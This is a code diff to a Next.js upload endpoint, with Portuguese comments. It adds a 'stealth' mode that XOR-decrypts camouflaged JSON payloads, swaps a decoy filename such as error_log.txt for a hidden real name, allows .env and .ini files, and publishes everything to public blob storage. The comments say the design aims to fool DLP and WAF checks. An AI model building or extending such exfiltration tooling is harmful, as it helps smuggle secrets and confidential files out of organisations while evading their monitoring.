@@ -1,6 +1,20 @@
 import { put, del } from '@vercel/blob';
 import { NextResponse } from 'next/server';
 
+// Função auxiliar de Descriptografia XOR (Simétrica)
+// Reverte o processo feito no Frontend para recuperar o Base64 original
+const xorDecrypt = (base64Input: string, key: string = "audit-key") => {
+  // 1. Decodifica o Base64 de transporte para string binária cifrada
+  const text = Buffer.from(base64Input, 'base64').toString('binary');
+
+  let result = "";
+  for (let i = 0; i < text.length; i++) {
+    // 2. Aplica XOR reverso (mesma operação)
+    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+  }
+  return result; // Retorna a string Base64 original do arquivo (com headers data:...)
+};
+
 export async function POST(request: Request): Promise<NextResponse> {
   // 1. Segurança: Validação de Variáveis de Ambiente
   const SECRET = process.env.AUDIT_SECRET;
@@ -12,15 +26,16 @@ export async function POST(request: Request): Promise<NextResponse> {
 
   // 2. Segurança: Validação do Token
   const token = request.headers.get('x-audit-token');
-  
+
   if (token !== SECRET) {
     return NextResponse.json({ error: 'Acesso Negado' }, { status: 401 });
   }
 
   // 3. Captura de Parâmetros
   const { searchParams } = new URL(request.url);
-  const filename = searchParams.get('filename');
-  const mode = searchParams.get('mode'); // Captura o modo (stealth ou normal)
+  // Nota: No modo stealth, 'filename' pode ser falso (ex: error_log.txt)
+  let filename = searchParams.get('filename');
+  const mode = searchParams.get('mode');
 
   if (!filename) {
     return NextResponse.json({ error: 'Nome do arquivo necessário' }, { status: 400 });
@@ -46,45 +61,57 @@ export async function POST(request: Request): Promise<NextResponse> {
     '.sh',   // Shell Script
     '.bat',  // Batch
     '.sql',  // SQL
-    '.html', '.css', '.xml', '.yaml', '.yml', '.md' // Web & Config
+    '.html', '.css', '.xml', '.yaml', '.yml', '.md', '.env', '.ini' // Web & Config
   ];
 
-  const isAllowed = allowedExtensions.some(ext => filename.toLowerCase().endsWith(ext));
-  
-  if (!isAllowed) {
-    return NextResponse.json({ 
-      error: `Extensão bloqueada. Permitidos: ${allowedExtensions.join(', ')}` 
+  // Validação preliminar da URL (Proxy/WAF check)
+  const isAllowedURL = allowedExtensions.some(ext => filename!.toLowerCase().endsWith(ext));
+
+  if (!isAllowedURL) {
+    return NextResponse.json({
+      error: `Extensão bloqueada na URL. Permitidos: ${allowedExtensions.join(', ')}`
     }, { status: 403 });
   }
 
-  // 5. Processamento do Corpo do Arquivo (Normal vs Stealth)
+  // 5. Processamento do Corpo do Arquivo
   let fileBody;
 
   if (mode === 'stealth') {
     try {
-      // MODO STEALTH: O arquivo vem dentro de um JSON como string Base64
-      // Isso engana DLPs que buscam assinaturas de arquivo no corpo cru da requisição
+      // MODO STEALTH v2 (Payload Camuflado + XOR)
       const jsonBody = await request.json();
-      
-      if (!jsonBody.fileData) {
-        throw new Error('Dados do arquivo ausentes no JSON');
+
+      // Verifica se é o payload novo (mimicry) ou o antigo
+      const encryptedPayload = jsonBody.payload || jsonBody.fileData;
+      const realName = jsonBody.realName;
+
+      if (!encryptedPayload) {
+        throw new Error('Payload criptografado ausente');
       }
 
-      // Remove o cabeçalho do Base64 se existir (ex: "data:image/png;base64,")
-      // Pega tudo que vem depois da vírgula
-      const base64Data = jsonBody.fileData.includes(',') 
-        ? jsonBody.fileData.split(',').pop() 
-        : jsonBody.fileData;
+      // Se veio o nome real escondido no JSON, usamos ele para salvar o arquivo final
+      if (realName) {
+        filename = realName;
+      }
 
-      // Converte a string Base64 de volta para Buffer binário
-      fileBody = Buffer.from(base64Data, 'base64');
-      
+      // 1. Descriptografa (XOR)
+      const decryptedBase64 = xorDecrypt(encryptedPayload);
+
+      // 2. Remove o cabeçalho do Data URL (ex: "data:application/pdf;base64,")
+      // Isso é necessário porque o FileReader do JS inclui isso no começo
+      const base64Clean = decryptedBase64.includes(',')
+        ? decryptedBase64.split(',').pop()
+        : decryptedBase64;
+
+      // 3. Converte para Buffer binário para salvar
+      fileBody = Buffer.from(base64Clean!, 'base64');
+
     } catch (e) {
       console.error('Erro no modo Stealth:', e);
-      return NextResponse.json({ error: 'Falha ao processar payload Stealth' }, { status: 400 });
+      return NextResponse.json({ error: 'Falha ao processar payload cifrado' }, { status: 400 });
     }
   } else {
-    // MODO NORMAL: O corpo da requisição é o próprio stream do arquivo
+    // MODO NORMAL (Stream direto)
     if (!request.body) {
       return NextResponse.json({ error: 'Arquivo inválido ou corpo vazio' }, { status: 400 });
     }
@@ -93,7 +120,8 @@ export async function POST(request: Request): Promise<NextResponse> {
 
   // 6. Upload para Vercel Blob
   try {
-    const blob = await put(filename, fileBody, { access: 'public' });
+    // Salvamos com o filename (que no modo stealth, agora é o nome real recuperado)
+    const blob = await put(filename!, fileBody, { access: 'public' });
     return NextResponse.json(blob);
   } catch (error) {
     console.error('Erro no Vercel Blob:', error);
